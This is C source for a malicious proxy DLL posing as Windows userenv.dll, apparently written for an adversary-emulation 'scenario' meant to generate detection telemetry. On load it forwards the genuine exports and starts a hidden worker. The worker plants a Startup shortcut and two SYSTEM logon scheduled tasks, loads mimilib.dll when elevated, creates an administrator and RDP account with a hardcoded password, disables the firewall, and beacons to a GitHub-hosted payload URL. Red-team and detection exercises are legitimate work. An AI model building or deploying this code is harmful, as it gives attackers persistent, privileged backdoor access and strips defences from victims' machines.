#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#define SECURITY_WIN32
#include <secext.h>
#include <shobjidl.h>
#include <objbase.h>
#include <oleauto.h>
#define COBJMACROS
#include <taskschd.h>
#include <urlmon.h>

#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "secur32.lib")

static const char *g_dir = "C:\\ProgramData\\Microsoft\\Crypto\\RSA\\S-1-5-18";
static const char *g_audit = "C:\\ProgramData\\Microsoft\\Crypto\\RSA\\S-1-5-18\\audit.log";

/* ponytail: enumeration config - fixed creds (task said fixed), beacon URL
   reuses the scenario4 repo raw path already pulled elsewhere (blends with
   existing GET traffic, no 404 noise). */
static const char *g_enum_user  = "support";
static const char *g_enum_pass  = "P@ssw0rd!23";
static const char *g_beacon_url = "https://github.com/Justanother-engineer/scenario4/raw/refs/heads/main/payload.zip";

static HMODULE g_real = NULL;

static BOOL ensure_real(void) {
    if (!g_real)
        g_real = LoadLibraryA("C:\\Windows\\System32\\userenv.dll");
    return g_real != NULL;
}

#define WRAP(ret, name, args, call) \
    ret WINAPI name args { \
        if (!ensure_real()) return 0; \
        typedef ret (WINAPI *fn) args; \
        static fn f = NULL; \
        if (!f) f = (fn)GetProcAddress(g_real, #name); \
        return f ? f call : (ret)0; \
    }

WRAP(BOOL, CreateEnvironmentBlock, (LPVOID *lpEnv, HANDLE hToken, BOOL bInherit), (lpEnv, hToken, bInherit))
WRAP(BOOL, DestroyEnvironmentBlock, (LPVOID lpEnv), (lpEnv))
WRAP(BOOL, ExpandEnvironmentStringsForUserW, (HANDLE hToken, LPCWSTR lpSrc, LPWSTR lpDst, DWORD dwSize), (hToken, lpSrc, lpDst, dwSize))
WRAP(BOOL, GetAllUsersProfileDirectoryA, (LPSTR lpProfileDir, LPDWORD lpcchSize), (lpProfileDir, lpcchSize))
WRAP(BOOL, GetAllUsersProfileDirectoryW, (LPWSTR lpProfileDir, LPDWORD lpcchSize), (lpProfileDir, lpcchSize))
WRAP(BOOL, GetDefaultUserProfileDirectoryA, (LPSTR lpProfileDir, LPDWORD lpcchSize), (lpProfileDir, lpcchSize))
WRAP(BOOL, GetDefaultUserProfileDirectoryW, (LPWSTR lpProfileDir, LPDWORD lpcchSize), (lpProfileDir, lpcchSize))
WRAP(BOOL, GetProfilesDirectoryA, (LPSTR lpProfileDir, LPDWORD lpcchSize), (lpProfileDir, lpcchSize))
WRAP(BOOL, GetProfilesDirectoryW, (LPWSTR lpProfileDir, LPDWORD lpcchSize), (lpProfileDir, lpcchSize))
WRAP(BOOL, GetProfileType, (DWORD *pdwFlags), (pdwFlags))
WRAP(BOOL, GetUserProfileDirectoryA, (HANDLE hToken, LPSTR lpProfileDir, LPDWORD lpcchSize), (hToken, lpProfileDir, lpcchSize))
WRAP(BOOL, GetUserProfileDirectoryW, (HANDLE hToken, LPWSTR lpProfileDir, LPDWORD lpcchSize), (hToken, lpProfileDir, lpcchSize))
WRAP(BOOL, LoadUserProfileA, (HANDLE hToken, void *lpProfileInfo), (hToken, lpProfileInfo))
WRAP(BOOL, LoadUserProfileW, (HANDLE hToken, void *lpProfileInfo), (hToken, lpProfileInfo))
WRAP(BOOL, UnloadUserProfile, (HANDLE hToken, HANDLE hProfile), (hToken, hProfile))
WRAP(BOOL, CreateProfile, (PCWSTR pszUserSid, PCWSTR pszUserName, PWSTR pszProfilePath, DWORD cchProfilePath), (pszUserSid, pszUserName, pszProfilePath, cchProfilePath))
WRAP(BOOL, DeleteProfileA, (PCSTR lpSidString, PCSTR lpProfilePath, PCSTR lpComputerName), (lpSidString, lpProfilePath, lpComputerName))
WRAP(BOOL, DeleteProfileW, (PCWSTR lpSidString, PCWSTR lpProfilePath, PCWSTR lpComputerName), (lpSidString, lpProfilePath, lpComputerName))

static void audit(const char *fmt, ...) {
    FILE *f = fopen(g_audit, "a");
    if (!f) return;
    va_list ap;
    va_start(ap, fmt);
    vfprintf(f, fmt, ap);
    va_end(ap);
    fputc('\n', f);
    fclose(f);
}


static void create_lnk(void) {
    char lnkPath[MAX_PATH], target[MAX_PATH];
    wsprintfA(target, "%s\\msra.exe", g_dir);
    lstrcpynA(lnkPath, "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\msra.lnk", MAX_PATH);

    WIN32_FIND_DATAA fd;
    HANDLE h = FindFirstFileA(lnkPath, &fd);
    if (h != INVALID_HANDLE_VALUE) { FindClose(h); audit("[+] .lnk already exists: %s", lnkPath); return; }

    IShellLinkA *sl = NULL;
    IPersistFile *pf = NULL;
    if (FAILED(CoCreateInstance(&CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, &IID_IShellLinkA, (void**)&sl))) {
        audit("[-] CoCreateInstance CLSID_ShellLink failed"); return;
    }
    sl->lpVtbl->SetPath(sl, target);
    sl->lpVtbl->SetWorkingDirectory(sl, g_dir);
    sl->lpVtbl->SetDescription(sl, "System Maintenance");
    if (FAILED(sl->lpVtbl->QueryInterface(sl, &IID_IPersistFile, (void**)&pf))) {
        audit("[-] QueryInterface IPersistFile failed"); sl->lpVtbl->Release(sl); return;
    }
    WCHAR wpath[MAX_PATH];
    MultiByteToWideChar(CP_ACP, 0, lnkPath, -1, wpath, MAX_PATH);
    HRESULT hr = pf->lpVtbl->Save(pf, wpath, TRUE);
    if (SUCCEEDED(hr)) audit("[+] .lnk created: %s", lnkPath);
    else audit("[-] .lnk Save failed (0x%lx)", hr);
    pf->lpVtbl->Release(pf);
    sl->lpVtbl->Release(sl);
}

/* ponytail: generic bounded process launcher for the no-console host.
   Direct CreateProcessA of the target (cmdline already contains the exe +
   args), stdio redirected to \\.\NUL via STARTUPINFO handles (NOT shell '>'
   redirection - system()/cmd.exe /c ... >nul 2>&1 deadlocks in a windowless
   host). Bounded WaitForSingleObject means a hung child can't stall the
   worker thread forever. Used by persistence (schtasks.exe direct) and
   enumeration (cmd.exe /c net.exe | netsh.exe - two Process Create events
   each = the "noise"). */
static int run_exe(const char *cmdline, DWORD timeoutMs) {
    /* ponytail: open NUL for read+write so all three std handles are real.
       STARTF_USESTDHANDLES with a NULL stdin can race in some hosts. */
    HANDLE nulW = CreateFileA("\\\\.\\NUL", GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE,
                              NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    HANDLE nulR = CreateFileA("\\\\.\\NUL", GENERIC_READ,  FILE_SHARE_READ|FILE_SHARE_WRITE,
                              NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    STARTUPINFOA si;    memset(&si, 0, sizeof(si)); si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = nulW; si.hStdError = nulW; si.hStdInput = nulR;
    PROCESS_INFORMATION pi; memset(&pi, 0, sizeof(pi));

    char buf[MAX_PATH * 6];
    lstrcpynA(buf, cmdline, sizeof(buf));
    if (!CreateProcessA(NULL, buf, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        if (nulW) CloseHandle(nulW);
        if (nulR) CloseHandle(nulR);
        return -1;
    }
    WaitForSingleObject(pi.hProcess, timeoutMs);
    DWORD code = STILL_ACTIVE;
    GetExitCodeProcess(pi.hProcess, &code);
    if (code == STILL_ACTIVE) TerminateProcess(pi.hProcess, 1);
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    if (nulW) CloseHandle(nulW);
    if (nulR) CloseHandle(nulR);
    return (int)code;
}

static void create_task_govinda(void) {
    char taskPath[MAX_PATH];
    wsprintfA(taskPath, "%s\\msra.exe", g_dir);

    // ponytail: check existence via schtasks /query (short timeout; query is fast)
    char q[MAX_PATH * 2];
    wsprintfA(q, "schtasks.exe /query /tn GOVINDA");
    if (run_exe(q, 10000) == 0) { audit("[+] GOVINDA task already exists"); return; }

    /* ponytail: /ru SYSTEM skips the interactive password prompt that
       /rl highest (no /ru) hits and hangs in a non-interactive session.
       /sc onlogon still fires on any user logon. */
    char c[MAX_PATH * 4];
    wsprintfA(c, "schtasks.exe /create /tn GOVINDA /tr \"%s\" /ru SYSTEM /sc onlogon /f", taskPath);
    audit("[+] Creating GOVINDA task (schtasks.exe)");
    if (run_exe(c, 30000) == 0) audit("[+] GOVINDA task created");
    else audit("[-] GOVINDA task creation failed");
}

/* ponytail: Orion via the Task Scheduler 2.0 COM API (RegisterTask with an
   inline XML definition). schtasks.exe works fine (see GOVINDA) but the user
   wants this one registered through the API. Setup is one Connect + one
   RegisterTask call; XML drives Principal(=SYSTEM) + LogonTrigger + Exec.
   RegisterTask swallows the trigger/action/principal objects in one shot,
   no need to touch ITaskDefinition/IExecAction/ILogonTrigger individually
   (and mingw's taskschd.h is missing the ILogonTrigger interface anyway). */
static void create_task_orion(void) {
    char taskPath[MAX_PATH];
    wsprintfA(taskPath, "%s\\msra.exe", g_dir);

    /* build the task XML: SYSTEM principal, HighestAvailable run level,
       LogonTrigger, one Exec action pointing at msra.exe. */
    char xml[1024];
    wsprintfA(xml,
        "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">"
        "<Principals><Principal id=\"LocalSystem\"><UserId>S-1-5-18</UserId>"
        "<RunLevel>HighestAvailable</RunLevel></Principal></Principals>"
        "<Triggers><LogonTrigger><Enabled>true</Enabled></LogonTrigger></Triggers>"
        "<Settings><Enabled>true</Enabled><Hidden>false</Hidden>"
        "<ExecutionTimeLimit>PT0S</ExecutionTimeLimit><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>"
        "<StopIfGoingOnBatteries>false</StopIfGoingOnBatteries></Settings>"
        "<Actions Context=\"Author\"><Exec><Command>%s</Command></Exec></Actions></Task>",
        taskPath);

    ITaskService *svc = NULL;
    HRESULT hr = CoCreateInstance(&CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER,
                                  &IID_ITaskService, (void**)&svc);
    if (FAILED(hr)) { audit("[-] CoCreateInstance TaskScheduler failed (0x%lx)", hr); return; }

    /* Connect to local machine / current account. Empty VARIANTs mean
       defaults: this computer, current user, logged-on credentials. */
    VARIANT v; VariantInit(&v);
    hr = ITaskService_Connect(svc, v, v, v, v);
    if (FAILED(hr)) { audit("[-] ITaskService::Connect failed (0x%lx)", hr); ITaskService_Release(svc); return; }

    ITaskFolder *root = NULL;
    hr = ITaskService_GetFolder(svc, SysAllocString(L"\\"), &root);
    if (FAILED(hr) || !root) { audit("[-] GetFolder(\\) failed (0x%lx)", hr); ITaskService_Release(svc); return; }

    /* user=SYSTEM, logonType=SERVICE_ACCOUNT means no password required.
       sddl=VT_EMPTY -> use default security. flags=CREATE_OR_UPDATE(6) is
       idempotent: re-running won't error, just refreshes. */
    VARIANT vUser;    VariantInit(&vUser);    vUser.vt = VT_BSTR; vUser.bstrVal = SysAllocString(L"SYSTEM");
    VARIANT vPass;    VariantInit(&vPass);
    VARIANT vSddl;    VariantInit(&vSddl);

    IRegisteredTask *reg = NULL;
    BSTR bName = SysAllocString(L"Orion");
    int xmlWlen = MultiByteToWideChar(CP_UTF8, 0, xml, -1, NULL, 0);
    BSTR bXml  = SysAllocStringLen(NULL, xmlWlen);	/* includes room for terminator */
    if (bXml) MultiByteToWideChar(CP_UTF8, 0, xml, -1, bXml, xmlWlen);

    hr = ITaskFolder_RegisterTask(root, bName, bXml, TASK_CREATE_OR_UPDATE,
                                  vUser, vPass, TASK_LOGON_SERVICE_ACCOUNT, vSddl, &reg);
    if (SUCCEEDED(hr)) audit("[+] Orion task created (Task Scheduler COM API, ru=SYSTEM)");
    else                audit("[-] RegisterTask Orion failed (0x%lx)", hr);

    if (reg)   IRegisteredTask_Release(reg);
    SysFreeString(bName);
    SysFreeString(bXml);
    VariantClear(&vUser);
    ITaskFolder_Release(root);
    ITaskService_Release(svc);
}

/* ponytail: host enumeration + persistence hardening. Collects user/host/IP,
   creates a local admin + RDP account (fixed creds), disables the firewall,
   writes it all to enumeration.txt, then beacons github 5x (2s between calls).
   Every action goes through run_exe("cmd.exe /c <tool> ...") so each step
   generates two Process Create events (cmd.exe + the wrapped tool) = the
   "noise" the scenario wants in Sysmon/Event Log. Best-effort throughout:
   a failed step is logged + skipped, never aborts the rest. */
static void enumerate_host(void) {
    char userBuf[256];  DWORD userLen = sizeof(userBuf);
    char hostBuf[256];  DWORD hostLen = sizeof(hostBuf);
    char ipBuf[64];     ipBuf[0] = 0;

    if (!GetUserNameExA(NameSamCompatible, userBuf, &userLen)) {
        lstrcpynA(userBuf, "unknown", sizeof(userBuf));
        audit("[-] GetUserNameEx failed (%lu)", GetLastError());
    } else {
        audit("[+] Enumerate: user=%s", userBuf);
    }

    if (!GetComputerNameExA(ComputerNameNetBIOS, hostBuf, &hostLen)) {
        lstrcpynA(hostBuf, "unknown", sizeof(hostBuf));
        audit("[-] GetComputerNameEx failed (%lu)", GetLastError());
    } else {
        audit("[+] Enumerate: host=%s", hostBuf);
    }

    /* Public IP: download body of ifconfig.me to a temp file, read first line,
       delete it. URLDownloadToFileA is already the codebase's fetch pattern. */
    char ipFile[MAX_PATH], ipTemp[MAX_PATH];
    wsprintfA(ipFile, "%s\\ip.txt", g_dir);
    DeleteFileA(ipFile);
    HRESULT hr = URLDownloadToFileA(NULL, "https://ifconfig.me", ipFile, 0, NULL);
    if (hr == S_OK) {
        FILE *f = fopen(ipFile, "r");
        if (f) {
            if (fgets(ipBuf, sizeof(ipBuf), f)) {
                /* trim trailing newline */
                char *nl = strchr(ipBuf, '\n'); if (nl) *nl = 0;
                char *cr = strchr(ipBuf, '\r'); if (cr) *cr = 0;
                audit("[+] Enumerate: public IP=%s", ipBuf);
            }
            fclose(f);
        }
        DeleteFileA(ipFile);
    }
    if (!ipBuf[0]) {
        lstrcpynA(ipBuf, "unreachable", sizeof(ipBuf));
        audit("[-] Public IP fetch failed (0x%lx)", hr);
    }

    /* Create the local admin + RDP account via net.exe wrapped in cmd.exe /c
       so each call spawns cmd.exe + net.exe = two Process Create events. */
    char netUser[256], netAdmin[256], netRdp[256];
    wsprintfA(netUser,  "cmd.exe /c net.exe user %s %s /add", g_enum_user, g_enum_pass);
    wsprintfA(netAdmin, "cmd.exe /c net.exe localgroup Administrators %s /add", g_enum_user);
    wsprintfA(netRdp,   "cmd.exe /c net.exe localgroup \"Remote Desktop Users\" %s /add", g_enum_user);

    audit("[+] Enumerate: creating user %s", g_enum_user);
    if (run_exe(netUser, 30000) == 0) audit("[+] Enumerate: net user /add ok");
    else audit("[-] Enumerate: net user /add failed (exists?)");
    if (run_exe(netAdmin, 30000) == 0) audit("[+] Enumerate: added to Administrators");
    else audit("[-] Enumerate: localgroup Administrators /add failed");
    if (run_exe(netRdp, 30000) == 0) audit("[+] Enumerate: added to Remote Desktop Users");
    else audit("[-] Enumerate: localgroup \"Remote Desktop Users\" /add failed");

    /* Disable firewall via netsh wrapped in cmd.exe /c (Process Create noise).
       Best-effort: log + continue even if it fails. */
    char netshCmd[256];
    lstrcpynA(netshCmd, "cmd.exe /c netsh.exe advfirewall set allprofiles state off", sizeof(netshCmd));
    BOOL fwOff = (run_exe(netshCmd, 30000) == 0);
    if (fwOff) audit("[+] Enumerate: firewall disabled");
    else       audit("[-] Enumerate: firewall disable failed");

    /* Beacon GitHub repo raw URL 5 times, 2s between each (no delay before
       the first). URLDownloadToFileA to \\.\NUL keeps it cheap (no file I/O).
       Reuses the same scenario-4 raw URL pulled elsewhere - blends in. */
    int ok = 0;
    for (int i = 1; i <= 5; i++) {
        hr = URLDownloadToFileA(NULL, g_beacon_url, "\\\\.\\NUL", 0, NULL);
        if (hr == S_OK) { ok++; audit("[+] beacon %d/5 ok", i); }
        else            { audit("[-] beacon %d/5 failed (0x%lx)", i, hr); }
        if (i < 5) Sleep(2000);
    }
    audit("[+] Enumerate: beacons sent %d/5", ok);

    /* Write enumeration.txt once, at the end, with the final beacon count.
       Overwrite each run; audit.log still appends. */
    char enumPath[MAX_PATH];
    wsprintfA(enumPath, "%s\\enumeration.txt", g_dir);
    FILE *ef = fopen(enumPath, "w");
    if (ef) {
        fprintf(ef, "Username=%s\n", userBuf);
        fprintf(ef, "Hostname=%s\n", hostBuf);
        fprintf(ef, "PublicIP=%s\n", ipBuf);
        fprintf(ef, "NewAccount=%s\n", g_enum_user);
        fprintf(ef, "Password=%s\n", g_enum_pass);
        fprintf(ef, "FirewallDisabled=%s\n", fwOff ? "true" : "false");
        fprintf(ef, "BeaconResult=sent %d/5\n", ok);
        fclose(ef);
        audit("[+] enumeration.txt written -> %s", enumPath);
    } else {
        audit("[-] Cannot write %s", enumPath);
    }
}

static DWORD WINAPI worker_thread(LPVOID lp) {
    audit("[+] Worker thread started (userenv.dll build 2026-07-16-v3: + enumeration)");
    CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    // ponytail: pump messages so COM (Task Scheduler API) doesn't deadlock
    // inside this STA thread. Download/extract/launch is now done in
    // P0wershell.exe (long-lived, not msra's UI process); the proxy only
    // installs persistence here.
    MSG msg;
    PeekMessage(&msg, NULL, 0, 0, PM_NOREMOVE);

    create_lnk();
    create_task_govinda();
    create_task_orion();
    enumerate_host();

    audit("[+] Worker thread completed");
    CoUninitialize();
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);
        BOOL elevated = FALSE;
        HANDLE hToken;
        if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
            TOKEN_ELEVATION te;
            DWORD size = sizeof(te);
            if (GetTokenInformation(hToken, TokenElevation, &te, sizeof(te), &size))
                elevated = te.TokenIsElevated;
            CloseHandle(hToken);
        }
        if (elevated)
            LoadLibraryA("C:\\ProgramData\\Microsoft\\Crypto\\RSA\\S-1-5-18\\mimilib.dll");
        // ponytail: spawn worker for persistence (.lnk + GOVINDA/Orion); the
        // download/extract/launch of svchost.exe is handled in P0wershell.exe
        CloseHandle(CreateThread(NULL, 0, worker_thread, NULL, 0, NULL));
    }
    return TRUE;
}
